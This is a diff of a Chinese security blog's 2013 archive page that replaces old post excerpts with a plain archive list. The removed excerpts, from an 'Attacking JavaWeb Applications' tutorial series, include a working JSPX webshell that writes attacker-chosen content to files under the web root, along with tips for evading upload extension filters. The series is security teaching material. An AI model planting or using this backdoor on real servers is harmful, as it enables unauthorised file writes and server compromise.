@@ -1,339 +1,274 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Archives: 2013 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Archives: 2013 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Archives: 2013 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="archive-icon">2013</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-10-21T21:09:36.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
-    
-    
-    | 
-    <a href='/tag/菜刀/'>菜刀</a>,
-    
-    <a href='/tag/后门/'>后门</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1043.seo/">攻击JavaWeb应用 8 -后门篇</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <h4><a href="http://drops.wooyun.org/tips/662">攻击JavaWeb应用[8]-后门篇</a></h4>  <h4>0x00 背景</h4>  <hr align="left" width="100%" noshade="noshade" size="2" />  <p>关于JavaWeb <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a> 问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。</p>  <h4>0x01 jspx <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a>&#160;</h4>  <hr align="left" width="100%" noshade="noshade" size="2" />  <p>在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配置文件的时候看到jsp和jspx都是由org.apache.jasper.servlet.JspServlet处理，于是想构建一个jspx的webshell。经过反复的折腾，一个jspx的后门就粗线了。测试应该是java的所有的server都默认支持。</p>  <h5>Tomcat默认的conf/web.xml下的配置：</h5>  <pre><code>&#160;&#160; &lt;servlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;fork&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;load-on-startup&gt;3&lt;/load-on-startup&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet&gt;</code></pre><br><br><pre><code>&#160;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;servlet-mapping&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;<em>.jsp&lt;/url-pattern&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;</em>.jspx&lt;/url-pattern&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet-mapping&gt;</code></pre><br><br><p>关于jspx的资料网上并不多，官网给的文档也不清楚，搞的模模糊糊的。怎么去玩jspx大家可以看下官网的demo，或者参考一些文章。</p><br><br><p><a href="http://jspx-bay.sourceforge.net/">http://jspx-bay.sourceforge.net</a></p><br><br><p>关于jspx文件的一些说明：</p><br><br><p><a href="http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html">http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html</a></p><br><br><p>重点在于把Jsp里面的一些标记转换成xml支持的格式，比如：</p><br><br><pre><code>&lt;%@ include .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.include .. /&gt;</code></pre><br><br><pre><code> &lt;%@ page .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.page .. /&gt;</code></pre><br><br><pre><code>&lt;%@ taglib .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; xmlns:prefix=&quot;tag library URL&quot;</code></pre><br><br><pre><code>&lt;%= ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:expression&gt; .. &lt;/jsp:expression&gt;</code></pre><br><br><pre><code>&lt;% ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:scriptlet&gt; .. &lt;/jsp:scriptlet&gt;</code></pre><br><br><p>知道&lt;% %&gt;可以用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>标记表示那么做起来就很简单了，直接把标记换下是非常容易做的。所以写个简单的shell一个就很简单了，但是如果想知道具体有那些标签或者说跟jsp里面的有那些不同怎么办呢？下面我简单的做了下对比（前面是jsp的代码提示，后面是jspx）：</p><br><br><p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image001.jpg"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="353" alt="clip_image001" src="http://img.cker.in/JavaWeb8_9E52/clip_image001_thumb.jpg" width="392" border="0" /></a></p><br><br><p>照着提示翻译下得知表示jsp里面的&lt;%! %&gt;需要用：<code>&lt;jsp:declaration&gt;&lt;/jsp:declaration&gt;</code>标签去替换就行了。</p><br><br><h5>其他重要提醒：</h5><br><br><p>在jspx里面遵循xml语法所以直接在jsp:declaration或者jsp:scriptlet标签内写&quot;&lt;&gt;&quot;这样的符号是不行的，需要转意（不转意会报编译错误，猜了下只需要把&lt;&gt;转成<code>&amp;lt;&#160;&#160; &amp;gt;</code>就行了）。</p><br><br><h5>jspx后门的具体实现代码：</h5><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:root xmlns:jsp=&quot;<a href="http://java.sun.com/JSP/Page&amp;quot">http://java.sun.com/JSP/Page&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns=&quot;<a href="http://www.w3.org/1999/xhtml&amp;quot">http://www.w3.org/1999/xhtml&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns:c=&quot;<a href="http://java.sun.com/jsp/jstl/core&amp;quot">http://java.sun.com/jsp/jstl/core&amp;quot</a>; version=&quot;1.2&quot;&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page import=&quot;java.io.<em>&quot; /&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:scriptlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; RandomAccessFile rf = new RandomAccessFile(request.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;), &quot;rw&quot;);</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.write(request.getParameter(&quot;t&quot;).getBytes());</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.close();</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/jsp:scriptlet&gt;</code></pre><br><br><pre><code>&lt;/jsp:root&gt;</code></pre><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1043.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+  <div class="archiveslist archive-float clearfix">
+   <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">2016年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">2016年04月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">2016年01月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">2015年10月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">2015年09月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">2015年07月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">2015年06月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">2015年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">2015年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">2015年03月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">2015年01月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">2014年12月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">2014年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">2014年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">2014年08月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">2014年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">2014年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/05/">2014年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">2014年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">2014年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">2014年02月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">2014年01月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">2013年12月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">2013年11月</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">2013年10月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/09/">2013年09月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08/">2013年08月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">2013年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">2013年06月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">2013年05月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">2013年04月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">2013年03月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/02/">2013年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">2013年01月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">2012年12月</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">2012年11月</a><span class="archive-list-count">28</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">2012年10月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">2012年09月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">2012年08月</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">2012年07月</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">2012年06月</a><span class="archive-list-count">58</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">2012年05月</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">2012年04月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">2012年03月</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/02/">2012年02月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">2012年01月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">2011年12月</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">2011年11月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">2011年10月</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">2011年09月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">2011年08月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">2011年07月</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">2011年06月</a><span class="archive-list-count">7</span></li></ul>
+ </div>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-10-21T21:04:30.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
-    
-    
-    | 
-    <a href='/tag/Webshell/'>Webshell</a>,
-    
-    <a href='/tag/getshell/'>getshell</a>,
-    
-    <a href='/tag/Java/'>Java</a>,
-    
-    <a href='/tag/Tomcat/'>Tomcat</a>,
-    
-    <a href='/tag/GlassFish/'>GlassFish</a>,
-    
-    <a href='/tag/WebLogic/'>WebLogic</a>,
-    
-    <a href='/tag/Resin/'>Resin</a>,
-    
-    <a href='/tag/Websphere/'>Websphere</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1042.seo/">攻击JavaWeb应用 7 -Server篇 1</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><a href="http://drops.wooyun.org/tips/604">攻击JavaWeb应用[7]-Server篇[1]</a></p>  <p><a href="http://drops.wooyun.org/tips/604">http://drops.wooyun.org/tips/604</a></p>  <h4>java应用服务器</h4>  <hr align="center" width="100%" size="2" />  <p><a href="http://Ha.Cker.In/tag/Java" target="_blank">Java</a>应用服务器主要为应用程序提供运行环境，为组件提供服务。Java 的应用服务器很多，从功能上分为两类：JSP 服务器和 Java EE 服务器。</p>  <h5>常见的Server概述</h5>  <p>常见的Java服务器:<a href="http://Ha.Cker.In/tag/Tomcat" target="_blank">Tomcat</a>、<a href="http://Ha.Cker.In/tag/Weblogic" target="_blank">Weblogic</a>、<a href="http://Ha.Cker.In/tag/JBoss" target="_blank">JBoss</a>、<a href="http://Ha.Cker.In/tag/GlassFish" target="_blank">GlassFish</a>、Jetty、Resin、IBM Websphere、Bejy Tiger、Geronimo、Jonas、Jrun、Orion、TongWeb、BES Application Server、ColdFusion、Apusic Application Server、Sun Application Server 、Oracle9i/AS、Sun Java System Application Server。</p>  <p>Myeclipse比较方便的配置各式各样的Server，一般只要简单的选择下Server的目录就行了。</p>  <p><a href="http://img.cker.in/JavaWeb7Server1_9DDC/clip_image001.png"><img title="clip_image001" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="607" alt="clip_image001" src="http://img.cker.in/JavaWeb7Server1_9DDC/clip_image001_thumb.png" width="628" border="0" /></a></p>  <p>部署完成后启动进入各个Server的后台：</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1042.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-10-21T20:52:58.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
-    
-    
-    | 
-    <a href='/tag/xss/'>xss</a>,
-    
-    <a href='/tag/Java/'>Java</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1041.seo/">攻击JavaWeb应用 6 -程序架构与代码审计</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><a href="http://drops.wooyun.org/tips/429">攻击JavaWeb应用[6]-程序架构与代码审计</a></p>  <p><a href="http://drops.wooyun.org/tips/429">http://drops.wooyun.org/tips/429</a></p>  <h6>注：</h6>  <p>不管多么强大的系统总会有那么些安全问题，影响小的可能仅仅只会影响用户体验，危害性大点的可能会让攻击者获取到服务器权限。这一节重点是怎样去找到并利用问题去获取一些有意思的东西。</p>  <h6>Before:</h6>  <p>有MM的地方就有江湖，有程序的地方就有漏洞。现在已经不是SQL注入漫天的年代了，Java的一些优秀的开源框架让其项目坚固了不少。在一个中大型的Web应用漏洞的似乎永远都存在，只是在于影响的大小、发现的难易等问题。有很多比较隐晦的漏洞需要在了解业务逻辑甚至是查看源代码才能揪出来。JavaWeb跟PHP和ASP很大的不同在于其安全性相对来说更高。但是具体体现在什么地方？JavaWeb开发会有那些问题？这些正是我们今天讨论的话题。</p>  <h4>JavaWeb开发概念</h4>  <hr align="center" width="100%" size="2" />  <h5><a href="http://Ha.Cker.In/tag/Java" target="_blank">Java</a>分层思想</h5>  <p>通过前面几章的介绍相信已经有不少的朋友对Jsp、Servlet有一定了解了。上一节讲MVC的有说的JSP+Servlet构成了性能好但开发效率并不高的Model2。在JavaWeb开发当中一般会分出很多的层去做不同的业务。</p>  <h6>常见的分层</h6>  <pre><code>1、展现层(View 视图) </code></pre><br><br><pre><code>2、控制层（Controller 控制层） </code></pre><br><br><pre><code>3、服务层（Service） </code></pre><br><br><pre><code>4、实体层（entity 实体对象、VO(value object) 值对象 、模型层（bean）。</code></pre><br><br><pre><code>5、业务逻辑层BO(business object) </code></pre><br><br><pre><code>6、持久层（dao- Data Access Object 数据访问层、PO(persistant object) 持久对象）</code></pre><br><br><h5>依赖关系</h5><br><br><p>在了解一个项目之前至少要知道它的主要业务是什么主要的业务逻辑和容易出现问题的环节。其次是了解项目的结构和项目当中的类依赖。再次才是去根据业务模块去读对应的代码。从功能去关联业务代码入手往往比逮着段代码就看效率高无数倍。</p>
-
-<p>前几天在Iteye看到一款不错的生成项目依赖图的工具- Structure101，试用了下Structure101感觉挺不错的，不过是收费的而且价格昂贵。用Structure101生成Jeebbs的项目架构图：</p>
-
-<p><a href="http://img.cker.in/JavaWeb6_9C8E/clip_image001.png"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="635" alt="clip_image001" src="http://img.cker.in/JavaWeb6_9C8E/clip_image001_thumb.png" width="982" border="0" /></a></p>
-
-<p>Structure101导入jeebss架构图-包调用： </p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1041.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/1043.seo/" title="攻击JavaWeb应用 8 -后门篇" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-10-21T20:05:06.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
+    <h1 itemprop="name">攻击JavaWeb应用 8 -后门篇</h1>
     
-    
-    | 
-    <a href='/tag/Struts2/'>Struts2</a>,
-    
-    <a href='/tag/MVC/'>MVC</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1040.seo/">攻击JavaWeb应用 5 -MVC安全</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><a href="http://drops.wooyun.org/tips/347">攻击JavaWeb应用[5]-MVC安全</a></p>  <p><a href="http://drops.wooyun.org/tips/347">http://drops.wooyun.org/tips/347</a></p>  <h5>注:这一节主要是消除很多人把JSP当作了JavaWeb的全部的误解，了解MVC及其框架思想。MVC是用于组织代码用一种业务逻辑和数据显示分离的方法，不管是Java的Struts2、SpringMVC还是PHP的ThinkPHP都爆出过高危的任意代码执行,本节重在让更多的人了解MVC和MVC框架安全，由浅到深尽可能的照顾没Java基础的朋友。所谓攻击JavaWeb，如果连JavaWeb是个什么，有什么特性都不知道，就算能用Struts刷再多的RANK又有何意义？还不如沏一杯清茶，读一本好书，不浮躁，撸上一天。</h5>  <h5>0x00、初识MVC</h5>  <hr align="center" width="100%" size="2" />  <p>传统的开发存在结构混乱易用性差耦合度高可维护性差等多种问题，为了解决这些毛病分层思想和<a href="http://Ha.Cker.In/tag/MVC" target="_blank">MVC</a>框架就出现了。MVC是三个单词的缩写,分别为： <strong>模型(Model),视图(View) 和控制(Controller)</strong>。 MVC模式的目的就是实现Web系统的职能分工。</p>  <p><strong>Model</strong><strong>层</strong>实现系统中的<strong>业务逻辑</strong>，通常可以用JavaBean或EJB来实现。</p>  <p><strong>View<em></strong><strong>层</strong>用于与<strong>用户的交互</strong>，通常用JSP来实现(前面有讲到，JavaWeb项目中如果不采用JSP作为展现层完全可以没有任何JSP文件，甚至是过滤一切JSP请求，JEECMS是一个最为典型的案例)。</p>  <p><strong>Controller</strong><strong>层</strong>是<strong>Model</strong><strong>与View之间沟通的桥梁</strong>，它可以分派用户的请求并选择恰当的视图用于显示，同时它也可以解释用户的输入并将它们映射为模型层可执行的操作。</p>  <p><a href="http://img.cker.in/JavaWeb5MVC_8EFB/clip_image001.jpg"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="321" alt="clip_image001" src="http://img.cker.in/JavaWeb5MVC_8EFB/clip_image001_thumb.jpg" width="330" border="0" /></a></p>  <h6><strong>Model1</strong><strong>和Model2：</strong></h6>  <p>Model1主要是用JSP去处理来自客户端的请求，所有的业务逻辑都在一个或者多个JSP页面里面完成，这种是最不科学的。举例:<a href="http://localhost/show_user.jsp?id=2。JSP页面获取到参数id=2就会带到数据库去查询数据库当中id等于">http://localhost/show_user.jsp?id=2。JSP页面获取到参数id=2就会带到数据库去查询数据库当中id等于</a> 2的用户数据，由于这样的实现方式虽然简单，但是维护成本就非常高。JSP页面跟逻辑业务都捆绑在一起高耦合了。而软件开发的目标就是为了去解耦，让程序之间的依赖性减小。在model1里面SQL注入等攻击简直就是家常便饭。因为在页面里面频繁的去处理各种业务会非常麻烦，更别说关注安全了。典型的Model1的代码就是之前用于演示的SQL注入的JSP页面。</p>  <h6><strong>Model1</strong><strong>的流程：</strong></h6>  <p><a href="http://img.cker.in/JavaWeb5MVC_8EFB/clip_image002.jpg"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="443" alt="clip_image002" src="http://img.cker.in/JavaWeb5MVC_8EFB/clip_image002_thumb.jpg" width="567" border="0" /></a></p>  <p>Model 2表示的是基于MVC模式的框架，JSP+Servlet。Model2已经带有一定的分层思想了，即Jsp只做简单的展现层，Servlet做后端的业务逻辑处理。这样视图和业务逻辑就相应的分开了。例如：<a href="http://localhost/ShowUserServlet?id=2">http://localhost/ShowUserServlet?id=2</a>。也就是说把请求交给Servlet处理，Servlet处理完成后再交给jsp或HTML做页面展示。JSP页面就不必要去关心你传入的id=2是怎么查询出来的，而是怎么样去显示id=2的用户的信息(多是用EL表达式或JSP脚本做页面展现)。视图和逻辑分开的好处是可以更加清晰的去处理业务逻辑，这样的出现安全问题的几率会相对降低。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1040.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2013-10-21T21:09:36.000Z" itemprop="datePublished">2013-10-22</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-10-21T19:56:10.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
-    
-    
-    | 
-    <a href='/tag/getshell/'>getshell</a>,
-    
-    <a href='/tag/Struts2/'>Struts2</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1039.seo/">攻击JavaWeb应用 4 -SQL注入 2</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
